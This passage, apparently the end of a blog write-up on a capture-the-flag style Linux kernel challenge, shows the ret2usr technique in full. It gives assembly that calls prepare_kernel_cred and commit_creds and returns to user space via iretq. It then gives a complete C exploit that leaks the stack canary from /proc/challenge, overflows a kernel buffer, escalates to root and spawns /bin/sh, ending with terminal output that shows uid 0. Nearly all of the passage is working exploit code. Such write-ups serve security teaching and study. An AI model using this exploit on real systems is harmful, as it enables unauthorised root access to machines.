&lt;span style="color:#a6e22e">call&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>
&lt;span style="color:#a6e22e">movabs&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>, &lt;span style="color:#66d9ef">commit_creds&lt;/span>
&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">rdi&lt;/span>, &lt;span style="color:#66d9ef">rax&lt;/span>
&lt;span style="color:#a6e22e">call&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="returning-to-user-space">Returning to User-Space&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-asm" data-lang="asm">&lt;span style="color:#a6e22e">swapgs&lt;/span>
&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">r15&lt;/span>, &lt;span style="color:#66d9ef">saved_ss&lt;/span>
&lt;span style="color:#a6e22e">push&lt;/span> &lt;span style="color:#66d9ef">r15&lt;/span>
&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">r15&lt;/span>, &lt;span style="color:#66d9ef">saved_rsp&lt;/span>
&lt;span style="color:#a6e22e">push&lt;/span> &lt;span style="color:#66d9ef">r15&lt;/span>
&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">r15&lt;/span>, &lt;span style="color:#66d9ef">saved_rflags&lt;/span>
&lt;span style="color:#a6e22e">push&lt;/span> &lt;span style="color:#66d9ef">r15&lt;/span>
&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">r15&lt;/span>, &lt;span style="color:#66d9ef">saved_cs&lt;/span>
&lt;span style="color:#a6e22e">push&lt;/span> &lt;span style="color:#66d9ef">r15&lt;/span>
&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">r15&lt;/span>, &lt;span style="color:#66d9ef">target_rip&lt;/span>
&lt;span style="color:#a6e22e">push&lt;/span> &lt;span style="color:#66d9ef">r15&lt;/span>
&lt;span style="color:#a6e22e">iretq&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;assert.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> save_ss, save_sp, save_rf, save_cs;
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">shell&lt;/span>()
{
system(&lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>);
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">save_user_space&lt;/span>()
{
&lt;span style="color:#75715e">/* save user-space */&lt;/span>
__asm__(
&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov save_ss, ss;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov save_sp, rsp;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;pushf;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;pop save_rf;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov save_cs, cs;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
);
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">load_user_space&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> target)
{
&lt;span style="color:#75715e">/* return to user-space */&lt;/span>
__asm__(
&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;swapgs;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_ss;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_sp;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_rf;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_cs;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, %[rip];&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;iretq;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
&lt;span style="color:#f92672">:&lt;/span> [rip] &lt;span style="color:#e6db74">&amp;#34;=&amp;amp;r&amp;#34;&lt;/span> (target)
);
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">escalate_privileges&lt;/span>()
{
&lt;span style="color:#75715e">/* escalate privileges */&lt;/span>
__asm__(
&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;xor rdi, rdi;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;movabs rbx, 0xffffffff810881c0;&amp;#34;&lt;/span> &lt;span style="color:#75715e">// prepare_kernel_cred
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#e6db74">&amp;#34;call rbx;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;movabs rbx, 0xffffffff81087e80;&amp;#34;&lt;/span> &lt;span style="color:#75715e">// commit_creds
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#e6db74">&amp;#34;mov rdi, rax;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;call rbx;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
);
&lt;span style="color:#75715e">/* return to user-space */&lt;/span>
load_user_space((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>)shell);
}
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">leak_canary&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd)
{
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> leak[&lt;span style="color:#ae81ff">5&lt;/span>];
read(fd, leak, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> leak[&lt;span style="color:#ae81ff">4&lt;/span>];
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">overflow_buffer&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary)
{
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> payload[&lt;span style="color:#ae81ff">6&lt;/span>];
payload[&lt;span style="color:#ae81ff">4&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> canary;
payload[&lt;span style="color:#ae81ff">5&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>)escalate_privileges;
write(fd, payload, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>);
}
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv)
{
save_user_space();
&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/proc/challenge&amp;#34;&lt;/span>, O_RDWR);
assert(fd &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;span style="color:#75715e">/* leak stack canary */&lt;/span>
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary &lt;span style="color:#f92672">=&lt;/span> leak_canary(fd);
printf(&lt;span style="color:#e6db74">&amp;#34;[*] canary @ 0x%lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, canary);
overflow_buffer(fd, canary);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>~/linux-kernel-exp/ret2usr $ id
uid=1000(ctf) gid=1000 groups=1000
~/linux-kernel-exp/ret2usr $ ./exploit
[*] canary @ 0xb30ee19bbcd24b00
/home/ctf/linux-kernel-exp/ret2usr # id
uid=0(root) gid=0
&lt;/code>&lt;/pre></content></item></channel></rss>